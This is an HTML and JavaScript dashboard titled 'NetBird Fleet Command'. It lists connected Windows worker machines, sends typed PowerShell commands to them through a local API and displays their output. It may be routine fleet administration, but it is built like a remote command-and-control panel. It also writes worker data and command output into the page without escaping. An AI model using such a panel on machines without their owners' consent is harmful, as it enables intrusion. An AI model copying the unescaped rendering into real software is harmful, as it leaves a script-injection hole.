<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NetBird Fleet Command</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #0f172a;
            --panel: #1e293b;
            --accent: #10b981;
            --accent-glow: rgba(16, 185, 129, 0.2);
            --text-main: #f1f5f9;
            --text-dim: #94a3b8;
            --danger: #ef4444;
            --border: #334155;
        }

        * { box-sizing: border-box; }
        body { 
            font-family: 'Inter', sans-serif; 
            margin: 0; 
            background: var(--bg); 
            color: var(--text-main); 
            display: flex;
            flex-direction: column;
            height: 100vh;
            overflow: hidden;
        }

        /* Header */
        header {
            padding: 1rem 2rem;
            background: rgba(15, 23, 42, 0.8);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 10;
        }

        header h1 { 
            font-size: 1.25rem; 
            margin: 0; 
            font-family: 'JetBrains Mono', monospace;
            color: var(--accent);
            letter-spacing: -1px;
        }

        .stats { display: flex; gap: 20px; font-size: 0.85rem; }
        .stat-item { color: var(--text-dim); }
        .stat-value { color: var(--accent); font-weight: bold; }

        /* Main Layout */
        main {
            display: grid;
            grid-template-columns: 350px 1fr;
            grid-template-rows: 1fr 300px;
            gap: 1rem;
            padding: 1rem;
            flex-grow: 1;
            overflow: hidden;
        }

        .panel {
            background: var(--panel);
            border: 1px solid var(--border);
            border-radius: 8px;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        .panel-header {
            padding: 0.75rem 1rem;
            background: rgba(0,0,0,0.2);
            border-bottom: 1px solid var(--border);
            font-size: 0.8rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            color: var(--text-dim);
            display: flex;
            justify-content: space-between;
        }

        /* Sidebar: Workers */
        #worker-panel { grid-row: span 2; }
        .scroll-area { overflow-y: auto; flex-grow: 1; padding: 10px; }

        .worker-card {
            background: rgba(255,255,255,0.03);
            border: 1px solid var(--border);
            border-radius: 6px;
            padding: 12px;
            margin-bottom: 8px;
            transition: all 0.2s;
        }
        .worker-card:hover { border-color: var(--accent); background: rgba(16, 185, 129, 0.05); }
        .worker-name { font-weight: 600; font-size: 0.9rem; margin-bottom: 4px; display: flex; align-items: center; justify-content: space-between;}
        .worker-meta { font-size: 0.75rem; color: var(--text-dim); font-family: 'JetBrains Mono'; }
        
        .status-pill {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            display: inline-block;
        }
        .online { background: var(--accent); box-shadow: 0 0 8px var(--accent); }
        .offline { background: var(--danger); }

        /* Command Input Area */
        .command-bar {
            padding: 20px;
            background: var(--panel);
            border-bottom: 1px solid var(--border);
        }
        .input-group {
            display: flex;
            gap: 10px;
            background: #000;
            padding: 5px;
            border-radius: 6px;
            border: 1px solid var(--border);
        }
        input {
            background: transparent;
            border: none;
            color: var(--accent);
            font-family: 'JetBrains Mono', monospace;
            padding: 10px;
            flex-grow: 1;
            outline: none;
        }
        button {
            background: var(--accent);
            color: #000;
            border: none;
            padding: 0 20px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            transition: opacity 0.2s;
        }
        button:hover { opacity: 0.8; }

        /* Logs / Results Area */
        pre {
            margin: 0;
            padding: 15px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            line-height: 1.5;
            color: #cbd5e1;
            white-space: pre-wrap;
        }

        .result-entry {
            border-bottom: 1px solid var(--border);
            padding: 10px;
        }
        .result-header { font-size: 0.7rem; color: var(--accent); margin-bottom: 5px; }

        /* Scrollbar Styling */
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
        ::-webkit-scrollbar-thumb:hover { background: var(--text-dim); }
    </style>
</head>
<body>

    <header>
        <h1>NETBIRD_FLEET_CMD v2.0</h1>
        <div class="stats">
            <div class="stat-item">WORKERS: <span id="count-workers" class="stat-value">0</span></div>
            <div class="stat-item">TASKS: <span id="count-tasks" class="stat-value">0</span></div>
            <div class="stat-item">STATUS: <span class="stat-value" style="color: var(--accent)">SYSTEM READY</span></div>
        </div>
    </header>

    <main>
        <!-- Left: Worker List -->
        <section class="panel" id="worker-panel">
            <div class="panel-header">Connected Nodes <span>● LIVE</span></div>
            <div class="scroll-area" id="workersList">
                <div style="padding: 20px; color: var(--text-dim)">Scanning for workers...</div>
            </div>
        </section>

        <!-- Right Top: Command & Results -->
        <section class="panel">
            <div class="command-bar">
                <div class="input-group">
                    <input type="text" id="commandInput" placeholder="root@fleet:~# enter powershell command..." autofocus>
                    <button id="sendBtn">EXECUTE</button>
                </div>
                <div id="commandHistory" style="margin-top: 10px; font-size: 0.7rem; color: var(--text-dim); font-family: 'JetBrains Mono';"></div>
            </div>
            <div class="panel-header">Output Stream</div>
            <div class="scroll-area" id="results" style="background: #0a0f1a;">
                <pre>_ awaiting input...</pre>
            </div>
        </section>

        <!-- Right Bottom: Task Queue -->
        <section class="panel">
            <div class="panel-header">Task Pipeline</div>
            <div class="scroll-area" id="tasks" style="background: #0a0f1a; font-size: 0.8rem;">
                <pre>No pending tasks.</pre>
            </div>
        </section>
    </main>

    <script>
        let history = [];

        async function updateData() {
            try {
                // Workers
                const resWorkers = await fetch('/api/workers');
                const workers = await resWorkers.json();
                document.getElementById('count-workers').innerText = workers.length;
                
                const workerHtml = workers.map(w => `
                    <div class="worker-card">
                        <div class="worker-name">
                            ${w.hostname || w.name || w.ip}
                            <span class="status-pill online"></span>
                        </div>
                        <div class="worker-meta">IP: ${w.ip}</div>
                        <div class="worker-meta">OS: ${w.os || 'Windows'}</div>
                        <div class="worker-meta" style="font-size: 0.65rem; margin-top:5px; opacity:0.6">LAST SEEN: ${w.lastSeen || 'Just now'}</div>
                    </div>
                `).join('');
                document.getElementById('workersList').innerHTML = workerHtml || '<div>No workers connected.</div>';

                // Tasks
                const resTasks = await fetch('/api/tasks');
                const tasks = await resTasks.json();
                document.getElementById('count-tasks').innerText = tasks.length;
                document.getElementById('tasks').innerHTML = `<pre>${JSON.stringify(tasks, null, 2)}</pre>`;

                // Results
                const resResults = await fetch('/api/results');
                const results = await resResults.json();
                const resultsHtml = results.reverse().map(r => `
                    <div class="result-entry">
                        <div class="result-header">>> TASK_COMPLETED | WORKER: ${r.workerId || 'unknown'}</div>
                        <pre style="padding:0">${typeof r.output === 'object' ? JSON.stringify(r.output, null, 2) : r.output}</pre>
                    </div>
                `).join('');
                document.getElementById('results').innerHTML = resultsHtml || '<pre>_ awaiting output...</pre>';

            } catch (e) {
                console.error("Poll error", e);
            }
        }

        setInterval(updateData, 3000);
        updateData();

        const cmdInput = document.getElementById('commandInput');
        const sendBtn = document.getElementById('sendBtn');
        const historyDiv = document.getElementById('commandHistory');

        sendBtn.onclick = async () => {
            const cmd = cmdInput.value.trim();
            if (!cmd) return;

            // Optimistic UI
            sendBtn.innerText = "SENDING...";
            sendBtn.disabled = true;

            await fetch('/api/tasks', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({command: cmd})
            });

            sendBtn.innerText = "EXECUTE";
            sendBtn.disabled = false;

            history.unshift(cmd);
            if (history.length > 5) history.pop();
            historyDiv.innerHTML = history.map(c => `<span>> ${c}</span>`).join(' &nbsp; ');
            cmdInput.value = '';
        };

        cmdInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') sendBtn.click();
        });
    </script>
</body>
</html>
